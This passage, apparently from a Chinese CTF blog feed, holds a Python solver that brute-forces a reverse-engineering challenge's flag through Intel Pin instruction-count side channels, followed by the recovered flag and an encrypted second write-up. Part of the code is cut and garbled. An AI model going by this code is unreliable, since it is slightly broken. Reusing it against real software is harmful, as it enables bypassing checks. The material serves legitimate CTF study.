class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>TARGET_BINARY = os.path.abspath(<span class="hljs-string">&#x27;./hyperjump&#x27;</span>)<br>FLAG_LEN = <span class="hljs-number">24</span><br><span class="hljs-comment"># 固定前缀和后缀</span><br>FLAG_PREFIX = <span class="hljs-string">&quot;flag&#123;&quot;</span><br>FLAG_SUFFIX = <span class="hljs-string">&quot;&#125;&quot;</span><br><br>START_INDEX = <span class="hljs-built_in">len</span>(FLAG_PREFIX)<br><br>PIN_ROOT = <span class="hljs-string">&#x27;/home/kali/Desktop/pintools/pin-external-4.0-linux&#x27;</span><br>PIN_TOOL_PATH = os.path.abspath(os.path.join(PIN_ROOT, <span class="hljs-string">&#x27;source/tools/ManualExamples/obj-intel64/inscount0.so&#x27;</span>))<br><br>PIN_CMD_LIST = [os.path.join(PIN_ROOT, <span class="hljs-string">&#x27;pin&#x27;</span>), <span class="hljs-string">&#x27;-t&#x27;</span>, PIN_TOOL_PATH, <span class="hljs-string">&#x27;--&#x27;</span>, TARGET_BINARY]<br><br>CHARSET = string.ascii_lowercase + string.digits + <span class="hljs-string">&quot;_@&#123;&#125;&quot;</span><br><br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br><br>dates = [<span class="hljs-string">&#x27;inscount.out&#x27;</span>, <span class="hljs-string">&#x27;inscount.txt&#x27;</span>, <span class="hljs-string">&#x27;pin.out&#x27;</span>]<br>    <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> candidates:<br>        path = os.path.join(workdir <span class="hljs-keyword">if</span> workdir <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;.&#x27;</span>, name)<br>        <span class="hljs-keyword">if</span> os.path.exists(path):<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    data = f.read()<br>                m = re.search(<span class="hljs-string">r&#x27;(\d+)\s+instructions&#x27;</span>, data)<br>                <span class="hljs-keyword">if</span> m:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(m.group(<span class="hljs-number">1</span>)), data<br>                m2 = re.search(<span class="hljs-string">r&#x27;(\d+)&#x27;</span>, data)<br>                <span class="hljs-keyword">if</span> m2:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(m2.group(<span class="hljs-number">1</span>)), data<br>            <span class="hljs-keyword">except</span> Exception:<br>                <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_inscount</span>(<span class="hljs-params">payload: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>    IO_TIMEOUT = <span class="hljs-number">5</span><br>    log.info(<span class="hljs-string">f&quot;Testing payload: <span class="hljs-subst">&#123;payload.decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)[:START_INDEX+<span class="hljs-number">1</span>]&#125;</span>...&quot;</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        proc = subprocess.run(<br>            PIN_CMD_LIST,<br>            <span class="hljs-built_in">input</span>=payload.decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>,<br>            capture_output=<span class="hljs-literal">True</span>,<br>            timeout=IO_TIMEOUT,<br>            text=<span class="hljs-literal">True</span>,<br>            cwd=<span class="hljs-string">&#x27;.&#x27;</span><br>        )<br><br>        stdout = proc.stdout <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span><br>        stderr = proc.stderr <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span><br>        exitcode = proc.returncode<br><br>        sys.stderr.write(<span class="hljs-string">f&quot;\n--- Pin Tool 完整输出 (Exit Code <span class="hljs-subst">&#123;exitcode&#125;</span>): ---\n&quot;</span>)<br>        <span class="hljs-keyword">if</span> stdout.strip():<br>            sys.stderr.write(<span class="hljs-string">&quot;[stdout]\n&quot;</span> + stdout.strip() + <span class="hljs-string">&quot;\n&quot;</span>)<br>        <span class="hljs-keyword">if</span> stderr.strip():<br>            sys.stderr.write(<span class="hljs-string">&quot;[stderr]\n&quot;</span> + stderr.strip() + <span class="hljs-string">&quot;\n&quot;</span>)<br>        sys.stderr.write(<span class="hljs-string">&quot;--------------------------------------------------\n&quot;</span>)<br><br>        combined = stdout + <span class="hljs-string">&quot;\n&quot;</span> + stderr<br><br>        match_re = re.search(<span class="hljs-string">r&#x27;(\d+)\s+instructions&#x27;</span>, combined, re.IGNORECASE)<br>        <span class="hljs-keyword">if</span> match_re:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(match_re.group(<span class="hljs-number">1</span>))<br><br>        lines = combined.strip().splitlines()<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(lines):<br>            s = line.strip()<br>            <span class="hljs-keyword">if</span> s.isdigit():<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(s)<br><br>        file_count, file_content = read_inscount_outfile(workdir=<span class="hljs-string">&#x27;.&#x27;</span>)<br>        <span class="hljs-keyword">if</span> file_count <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">try</span>:<br>                os.remove(<span class="hljs-string">&#x27;inscount.out&#x27;</span>)<br>            <span class="hljs-keyword">except</span> Exception:<br>                <span class="hljs-keyword">pass</span><br>            <span class="hljs-keyword">return</span> file_count<br><br>        low = combined.lower()<br>        <span class="hljs-keyword">if</span> exitcode <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> exitcode != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(k <span class="hljs-keyword">in</span> low <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;nope&#x27;</span>, <span class="hljs-string">&#x27;try again&#x27;</span>, <span class="hljs-string">&#x27;wrong&#x27;</span>, <span class="hljs-string">&#x27;incorrect&#x27;</span>]):<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>            <span class="hljs-keyword">if</span> stderr.strip():<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br>        <span class="hljs-keyword">if</span> exitcode == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">any</span>(k <span class="hljs-keyword">in</span> low <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;correct&#x27;</span>, <span class="hljs-string">&#x27;congrats&#x27;</span>, <span class="hljs-string">&#x27;success&#x27;</span>]):<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>**<span class="hljs-number">9</span><br><br>        log.warning(<span class="hljs-string">&quot;无法从 Pin 输出或文件中解析到指令数（stdout/stderr/file 均无数字）。&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">except</span> subprocess.TimeoutExpired <span class="hljs-keyword">as</span> te:<br>        sys.stderr.write(<span class="hljs-string">f&quot;[TIMEOUT] Pin 运行超时: <span class="hljs-subst">&#123;te&#125;</span>\n&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">except</span> FileNotFoundError <span class="hljs-keyword">as</span> fe:<br>        sys.stderr.write(<span class="hljs-string">f&quot;[FATAL] 找不到 pin 可执行文件或路径错误: <span class="hljs-subst">&#123;fe&#125;</span>\n&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        sys.stderr.write(<span class="hljs-string">f&quot;[FATAL ERROR] get_inscount 发生错误: <span class="hljs-subst">&#123;e&#125;</span>\n&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># 初始化 known_flag，并把 prefix/suffix 固定上去</span><br>    <span class="hljs-keyword">if</span> FLAG_LEN &lt; <span class="hljs-built_in">len</span>(FLAG_PREFIX) + <span class="hljs-built_in">len</span>(FLAG_SUFFIX):<br>        log.critical(<span class="hljs-string">&quot;FLAG_LEN 太短，不能容纳 prefix 和 suffix&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    known_flag = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;A&quot;</span> * FLAG_LEN)<br>    <span class="hljs-comment"># 固定前缀</span><br>    <span class="hljs-keyword">for</span> i, ch <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(FLAG_PREFIX):<br>        known_flag[i] = ch<br>    <span class="hljs-comment"># 固定后缀（最后一位）</span><br>    known_flag[-<span class="hljs-number">1</span>] = FLAG_SUFFIX<br><br>    fixed_positions = <span class="hljs-built_in">set</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(FLAG_PREFIX))) | &#123;FLAG_LEN - <span class="hljs-number">1</span>&#125;<br>    try_positions = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, FLAG_LEN) <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> fixed_positions <span class="hljs-keyword">and</span> i &gt;= START_INDEX]<br><br>    log.info(<span class="hljs-string">f&quot;开始爆破，长度 <span class="hljs-subst">&#123;FLAG_LEN&#125;</span>，字符集大小 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(CHARSET)&#125;</span>，从索引 <span class="hljs-subst">&#123;START_INDEX&#125;</span> 开始。&quot;</span>)<br>    log.info(<span class="hljs-string">f&quot;固定前缀: &#x27;<span class="hljs-subst">&#123;FLAG_PREFIX&#125;</span>&#x27;，固定后缀: &#x27;<span class="hljs-subst">&#123;FLAG_SUFFIX&#125;</span>&#x27;。将尝试位置: <span class="hljs-subst">&#123;try_positions&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(TARGET_BINARY):<br>        log.critical(<span class="hljs-string">f&quot;目标文件不存在: <span class="hljs-subst">&#123;TARGET_BINARY&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(PIN_TOOL_PATH):<br>        log.critical(<span class="hljs-string">f&quot;Pin Tool 不存在: <span class="hljs-subst">&#123;PIN_TOOL_PATH&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(PIN_CMD_LIST[<span class="hljs-number">0</span>]):<br>        log.critical(<span class="hljs-string">f&quot;Pin 可执行文件不存在: <span class="hljs-subst">&#123;PIN_CMD_LIST[<span class="hljs-number">0</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> try_positions:<br>        log.info(<span class="hljs-string">f&quot;\n&gt;&gt;&gt;&gt; 正在爆破第 <span class="hljs-subst">&#123;i&#125;</span> 位...&quot;</span>)<br><br>        max_count = <span class="hljs-number">0</span><br>        best_char = <span class="hljs-literal">None</span><br><br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> CHARSET:<br>            current_test = known_flag[:]<br>            current_test[i] = char<br>            payload = <span class="hljs-string">&quot;&quot;</span>.join(current_test).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>            count = get_inscount(payload)<br><br>            <span class="hljs-keyword">if</span> count == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> count &gt; max_count:<br>                max_count = count<br>                best_char = char<br>                log.info(<span class="hljs-string">f&quot;发现新的最大值: 字符 &#x27;<span class="hljs-subst">&#123;best_char&#125;</span>&#x27; -&gt; <span class="hljs-subst">&#123;max_count&#125;</span> 条指令&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> best_char:<br>            known_flag[i] = best_char<br>            log.success(<span class="hljs-string">f&quot;第 <span class="hljs-subst">&#123;i&#125;</span> 位确定为: &#x27;<span class="hljs-subst">&#123;best_char&#125;</span>&#x27;&quot;</span>)<br>            log.success(<span class="hljs-string">f&quot;当前 Flag: <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;&#x27;</span>.join(known_flag)&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            log.warning(<span class="hljs-string">f&quot;第 <span class="hljs-subst">&#123;i&#125;</span> 位爆破失败。所有字符返回 0。&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-comment"># 最后确保后缀是 &#x27;&#125;&#x27;</span><br>    known_flag[-<span class="hljs-number">1</span>] = FLAG_SUFFIX<br><br>    log.success(<span class="hljs-string">f&quot;\n--- 爆破完成 ---&quot;</span>)<br>    log.success(<span class="hljs-string">f&quot;最终 Flag: <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;&#x27;</span>.join(known_flag)&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202511122119173.png" alt="image-20251112211945106"></p><p>flag{m4z3d_vm_jump5__42}</p>]]></content>
    
    
    <categories>
      
      <category>reverse-探索的过程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>侧信道爆破</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>极客大挑战2025逆向部分题解</title>
    <link href="/2025/11/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982025%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <url>/2025/11/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982025%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="5e8c6983acd9a8f8a3e534eddcdd7308b7a167168e16d578c08595c15e15a9d4">3a2e3360fbf7da458ef81d542062e9917bb7dfcf6b0098cd7349ad1d57924f860337c3920945e84f631e40dd2bb29544cedf4ea88c0f443ad7626324f88024de6ec5d93be1670a0b13e42d42baf8c0696afceb92889cac8faf9f9e0151b092c8b68997731c83b85a971154258172f69fbc94334c5248534a3ff3fd6f714d9dfc4b96b52f28138ac0e136952723d4b3554d7e12b68b8809a07cfd5f0a6dd9d64fb0823884369075dff17ac0723ebd67bb0e68dceeb43a7313ee54a0a509f437258c6c82a49fbe10e6dec83c1f9df56a0b673e08265e3d34f96283271c09b598322062f77a0abd867c4b0def3b48f37ec4a6df18cb115f9c913fda2ab3bced9a08a4724b72db77023b8d66e5108ec358fa13d0243ee25b8176acde3bd028265a9550ac377168844c3f48e435e7671e3095f7ce5eb0bd39c1113828d62bde17b7401f791a17eed9683cd27ace2d2ac2202f43722d34aa1657d4f7756ecc3494507b792fae3154a867b31faad16f918b26be0e677d7d0696ef92ddd630e8b553f6b37f87c7718ac88edb5e4232c43f2edf999ab3804ba62d16c17f25181e18dddfe9990ca76bea54456e6a84441753b4e9d4e4e9bd1d90e75115f00f22231cb5f5af67fe262848433c2141cfc083fd54aaaf6728b9ce6325e00fe60fa9fe864c944f27511eb6e49f20f9b22c5a8cce589874f26f5c202da0046b51323f7dd6ac82a65afbc28316773b710d1f9697b3ff91514c41f158a63d1d3025f7244dae4e1663e7cdb15eaf01bee4426b6b3786e0f67b9f2537848fec8cae4293f3f66c06412484e06b6513d760f2a1ae4e50ea69c3fbde0f0e488386ac8473ab708b3b39a50cdb845772d1c79c37569526f4c0f6c8c75077b3043b1ccbf9f11a02b406d7453f9642e3ed8dbd49b273fba96fb96046215ccab6eb3c96d1226a5b44a3bc7285e2c3e9fb2963eda074c9d26dd70282766b2f6a6c3780b43738444ea454a8c0c6500c5382ce3fa0c1dbdc355c4cc605c2f6b77032d34acb6cf2716dfc95abe9bcc1e57832032de4935eedac218eb0d4c9aace916a1378dee77bb7d6f4b6253d73050015cb8195cd02f7b682effff30d2edf678b8b5086436a995d93078dd86e637d4e3c96ca07c1be0b03dd4791b5d8d509ff4f0f00615ed546332d852fdec8173337e2d3abea9febfdafa52555cc648d42f28b9495b273fd3654db7915c6b94875296f6bfc2da17b210a78f452529169345d82accf27e0b3f1af9194f4b37a55f39120a6b3989b0b9c42ec413c903e007ebd1244794f91d29e90ab080d14ab0fd8d3b8be7599da13d14c6ac2272e474b9bceb3c2bbbcd147b6cc408079e8af615607462dcbe6f482e32b6b5887d02682c521b158243f535b429acb5f0f6854238b6ebc0cbab407ec42b2d285154a50d911864c2fa156e09f37ac3bfffbdea196c1938c7070f8918db9a21d5849a4b15133c2337970cb43546492d54fb9bf22f1149531b33c6c90151eb438d7102826b421ce4ef5c3d24fc6177fe27c1c9859f62b6ca39fc6f6534ad7307881e3c9ddb188b58ed825fb13b0d2d9b2b7ab18ab03da9bcec55325e5b3d9c1284e8abc4966736ee86ee49348d32116f294057f217f39452c476fe32d2ea3559de7a22417eb9286bad3ec42339e32dbf582231917a257c6e108f80fc4d9d0ecdff2a41784ef3b84ad65438592b8313ec5cf9f1cfd1babd22e51b1663625fa16d3c1c8b7e109a2d27c10bef90c7764eb866579fc18eab1b9ae74ede2d614fc37bb5dbd00bbd255f0645c95eb8391ad21ef5018bc44d704148a5c4106a67a306a0c9730eac4158a0eef5bc702b8d7acff93c5bb63a1bdf66a60d3949c0cbc66e11121e8bc584498113078cd0045a6325bc3921cffeb1ea38868ce32f45c1809e7a588901d40fd04772620be10e6eb53f1db18eb2ef221fe3253b1df3586214601cdaefc5f3bdeebbd7f74c3db7ddf24deba6ddda91d6fb1eba900b20c8734139a7265cdeb209fe7bf307bccea33b7b370e9524e108589a7c45e8bdf4a6945788e653d28ec3c621d7b37c9db2c0ead3e2a50972cc08d1bc2bfa962541af4f2b9efc2e1af4eb4b22b9223404a2c15897e2f5cc435796d191c9316a057c1289e8008327fa75cd443c57de9bd6bed74cb8845891d3feca84645710da53626e975037d2ff4a0cf7fa13ad7e86e2091f75ce2588fecdfef47c20f7952c3837615c644dccc8f7fd20596e166054dd50292cce4a87e73e03f2843b71447508d7e98cb4f33f8853e330da1684658d898bc6f5802d80fae72e8ef91af030369c6e4d0af077aaf32d664678ab96258674b312f570eceedd2a9728d6fc8530ac0fbecfe7a944fcab82f7a7a112cff1acd68689cacd30b410f3678eb1f44ad5021f7456598d523635d0748014cafef158b41547032f41cf889201233834002e99f0663bb7dd610cdd3340a0b487ae89fa8de7f1fcd91f8334b99cc7a28923e6ecd79233b2927780cb2ae2f30a839385320c4cb1a7b0fbc93399ec70e4523a4c229b296635372932665f8eea8fc11f50539f59b471c650aabafd4a5012640e90af7dc23c00b65336cb7f90ec584aac7d65e03545aeeeb22e62d027f59be475a966002cef89052de83401047ebee49f3c6753d63215921b67217b8df807b869e7ed64ae7266280c72991d63f641f6488fd9a2e9ee694383e5a341ae437bb40cd549feff588825ec472662c4b7109acb81ed9b8f042743ae0ef37f84f4999fd5f14f175a7e7c538cd1a3428683fb4eff2623ab7487154c541bd3ca15b1e333b4b48853d22e9d7f16d2d24ca8dae5e5e580dc7a216ea6ccff0ce2d0b0d43ad825685218c57ec39899a0ce5779ca794127e264f092b0c5f42aef5845bfca21c7f01831acb87c426f3f321dff73870d3a64d420c5d145c3bddf3bb4254440f7a0ea31d0afb9b2675135dd3360e0a1b3f9055e804f42c0fbbde1d896c7b786b85800425961fef9dcc470a94d9e762946bfc8207d758d83f1cbca3f2e096d4b1309b2365e7831a49a35ba1ecd4fcf491eee9d6135268e216811dec8078a9bd5d3ae57e33d18ffe2fea61577961449db2c686e6e14fe2451a3ed0d1f907562391d86872dd66e5a41b841fdd449861b05058ed87816b98a8ea98d092ef0c782fecb12864f7ee4ff304c5fb0fb4dfbc5ca10cf9501f509c0e47a6fb78cbdf437761f7fe453a805e367b68cfe6bbf06b843e07c08d9ad0eff84bd338e028da88b3aea6afb535c72e9206fbf6e95568224fabbe0eaca0d2373e9d2a39a72622245834aee36d5aa3113043973b2cc1527e91912814d120936b79464a0cf2f40a7d07a203b80b429ecccd98d45d863c94f2be6a9af4617d98fd346930c1d9fd6f817710629e65d20185e15f21206fbbdbdbc69e5b1cb27f54e2725076ec47ea5d242bbc6b97442530ec032b970567afae6ba263a66dc1f36b6a60dc813823d6ae850d38de499acd233f7d933aa644f1dfac698eb298996afe9f0aacc5b26a76ecd8a4343f135a00a8a16fa8693e48392f78c4c02e1d84ec8c17e78581cb015811f47986be4877df1b88432460fdcf67867ef742d411d7c4409a54395a9abf9a0c25f574259d439c83cf7167d685a3843ef69ec744a51dd0a1e8f013ed2da118e0352775ec5271ba95ebe7ec39adc316659089602584bd9cf3f2740b751ff5312619ad6b9d232383e02d2c0e5126cfc2628339db40737809723a239ef924470d1609ad9a7c7232816982a5a7ec68040fec276db5ae1b3d73d0fd352a04eb27ab998d213cdf191f841767e7bcfcff65902cfc5b681ac1a7a3fd12e743446cb02bd886318da77eccceef8d11665edfd799510568ec9a70c316d6795166c805c0732a16769cd9934c7229ce4004beb45fbd7489491af80861105ce617625410539a8e095c8ed00fa0eea63469bbd0c3e52de07682251a54bbeaadd9eee9f44a9dcf078df185d7b74ada34360ca35c0cef63cc5835c86ec1e5eea42a55df5130e42cffd8e5a84ad40d2dc22b32463dfee0fe5a67231e8477475ba0d37de3622fb1f05896d2f3c6a4cdf8bc9f45e5b5a0ef0e63b043bf5b080e3d187c76830c4cc54627b74607de91383d09201f6ff844e146df6119e858b4fba3feb7402496e9a2b4ed4c38f364e18d5982327931f48b7d8998ea6292c74cb32bdb1eaa3d9772c21f5cacc253c04f2032b6515938fb657d811e941349f78a09f98d6e92de153133f7bac5d63089a413fcd5192bd5ec5963ae1ac9089b731709708c1dcc7846a377687e6af18823267ff67949602aa9c049b27fb04cc6a8079641eccc0d183d3dcc3cbc748edfcf7363b7d30a9350c9c1d622c90b37aba8bb4b72b3285848336b492e50abc1462f4c81d2f8193ca922a615945a2c65638dc9e2a36f6090eebe8161abfddab2d34164762f4797b7df900e986a79f720034d89075dd5cb9866d6564b4d82d783a8f85dc3c2c96de6e76a51f3e7f18223894ec44cbdd8671b3d5f59340788339759756bbb79dc2704b674a083ecac6b4c9cc9a5b68a11205a87a0980f41ca52b8a6eb304b710e631316a8ddb3d4ae005102fcecf77e4a51d78aa8f3582d71fa1d1c593761a566f95929dfb3fe746503c40b71c590a0740549b2e75dc052b9ff383e48540abd0527934099293ea1425fe8b56704623403358aef3aa5aff9748e4010b61c83fb6b7c8a00108a0524d5a9efe7d6fe9ab5330c15a7550808541858d715294fac83299adeabb59993c9344a144dd0c328bbf5fee61d283719d197a9e7f5e84b69e492b315ef98f53805ffc49e66326ec3618114cb04aff9591e87340b43a4c3f7f586e95637b2ccfec67818d4759849f8db7972bdd20e984b9c0d521ea7a4fffb309ce99601cc9cd69376265ca5d78b477781c49c260421a6414abc72afcef172f90229258c95f4b31c754cadf89524da656a2a4ef1c95fe54ee440404ec476ff210cd3ae604ac9e2ed700b6e8f82f85c9ff013b0b06ea57b42eeb7759142174a0b2989982c71bcdb04129be71a2aa382da679755aceebf3ea438dd0575abedd94639524c8234584ff17fa8681e8fa1d4df09fe15d458a74c4d590c942e690236f85a953351f328d7b06ceea4e6de27ec3d7b7125238da270502cbe6bff56bbf5784ddd860b2bef6908c468ea2535d1251258fcf220a13a735e3a506903f0bd894f546e9c167f08067051522290a6622dc886ffff1105f77acc4a512b9faa66747f47da657171b349e773dc8eb52d7f53b1842de247ee145b2839d9c4917beff0fce7748e05521cb97c87f4ce963f169ae99730a22c3eb198cda28e8e5d89cb4b7f132bb0d67001fbd74986a79a658c02f521d7cc1c7fddd40116e4e92fe83e670d6fcfa1b5974f6859703fe6b683bd1f68fee8cf13be800c8f5f5c5b2a2f96e14fab3aed313e7ad1045862e11be247cd6a6b71eb671a2ea02190bf10f9cb48a36fb97e95d383a548083a000e03764111997d6416f33d47e9abd943c69988291c1bdb92df9ddd6fb06190b716bd2ce81f5eb7f39f8883eb3095bcaa1f7db716339e21b24b3627e60dae1ff71d793668b36c4d95f4bc83d71734d0866b84dafb71672c0f5f8f326341572820cde070a0313d4f50f3f6e537218a77032f967338a73283478bec074d24351269ff19a5495ac66c957c14dfdde2475c091c82e7ce5d51ab3601a6c01cd6dc32e675f5d533752cd2705dd85d11d3c8edea25c6a1ae794281f2bfd6efa0b1195fb440d598323d0c9c64b83ba7c0be47455bbf9cfba0428a71dae87e203f009f8027dcd0e750c8fcda86a98132357dcd8c70ade1b7e2a4681708318b102bc2118775c17aafe3e3211ba395d26566185603fcdb77fa04970b285d335cb9514436ff699c91ef01aa129f2aeae47a6826161f2af189742512db7b0267d252ec5790b625d4d6532e94982acc1c8a40c8c52d9fe2907fd56bf5ccb351a002184244e4ff22e3ac721a295209bcda638ceed115cfca23058295efd59e4d3ab1877d049346396005b8c92e746ae1c55b823670b2d636d7ef069efd676a711d7680ea0b7d7b0a7697a9baa8e7f94c19d833c81bca314a1e4554e926b5f6603904d9c518050dfb9bd1654d2b64cce5eb9e7447bbee888e98f368c3686efb0262bf4b148e5528d47cf7a9840dd10c635c292e2facfac321aa63521cd2ffadd975898f75b1bfa20251028348a8bd8ebe146d0263c5e55b9ef91a66d37a9b4963e60deac78cf2af3ffbad5d83825b6b72a01d1dea61a931475743ffd6072e6f08a52a2df0b54bd69f7d44d2b210beb4736c7c655a37e74da120339c12cd19bb45770ffffbea8d48069543f239a65ea5e2bc85729620c4a55ed66606cd9a2dec3bab7f0e1e9a79bcea6a6e14521d179b519de4d2e499494e352a074b10de88aedf80991a5b8acf17aeeec5c0f3d070c3e3994ea3b60458180e4d4160e276a5781eee58a02d5dc15dbf1b083128bab66ccbf93941dc8c100ecb18a50572f337d2a4dea64b9175844b8eb756b512676602f2c35ca1b880028b5c1e6ea0dfa3485b9549cd9487e2d4512f31d92f7c3c92339733f13fa8241c8107cfccfb55fd110ad7b0881e6dfbf083fd02f631601b8d957d2dd9d0fc33bd4ec5c3a77e0372cbe2d7db7fc08c946e89461994878597c92b470cd70008cbf826edf91e89d72868388ef44d151e81b2744e4c73ef9473fbbb415db7bcc019fc146e64afc13820c9a2780003f577e723770fdfea6911b63c46e9c0abee8230db980eefa4e38f7af16c177c15f87f4d9649a29ca606d2a660c457cb9c2088b8df665aa3bd4c12d0483307f75898ba18befa21cef820c0785309b739a7d2fb42160d4e71a3a1899594bf2578fed353e9bca98378904ed14bc08648a91c75c80d963cb45ef46f1d855af660b10f9f1ab3dd482f4a802984172eb5b4af094e0ab39309b402fda4244b5436eede225ea3f643b684443bc0e1ec0d75ecde399ef41a8d3b3c89ffcf7c1d440dc41a71792a10ab5229e977b5ed45e3d8796fd62eff4f4dbacbd8266cb6bffdcde4c92b2882d6a62902b1f5d47e79e02d18a2995cf94ad248f24b80a4e9e45c2daf3de38762b70749a275615d8f752f1c8b26898f01d884337e4236ce96a3f6d1144a0755f04ff508545b822cdc0bbbe07f38a7c19848900188d6266bbeae400db3e3295eecb6b0316aee0e44229f533f9c41c598947c098bf0e2b0bdcf72578feead61b70f541892480d0dcbfb419a9fe40e54cdfd87fb4061b3a220e3ae52b5f0cbe8dccd33306405df124f29bf179c7835155c61d602fe9fdd839fe9e8c3b05e41f43ca221fb79936366b211de320021ceb301837d189c77ffb51f686532b68af2a2a194a346342a450580e041ccf773c293f51b6da55fd5480492a9425b1f0f4f0ce5e96d6c79c6a78ca7c2dbfaa5d3d89d7185db0ef04395fb40541b6b028e8d9e272ebe282a2e1ac312be6a1eff088a807b9e9b363004fd8c72c10e33dc233a74a18584b8576eabdae820a7228e653fe1e38e3431b72560af06b8ffa94ab898ec6f38999852bdb5bd5647fe62c295d250b27e6675b27f95de311b0a0af9b256f03e2e1dea267639eed86fb5774807df183314a316f59477358c357d3148607255bb9bd5ef3c3ab74dde975c6ae6658d47444056824dadc068fe1c22627fb580c46de4a2d5778aa63d4f7ce3a0ea4b203c4b43faff0afd148f2c11b0c8aecd75b6e5e18e67069927276c4df1649c2617faac587afec7e022a973942686896e110dd0bd2740cb1a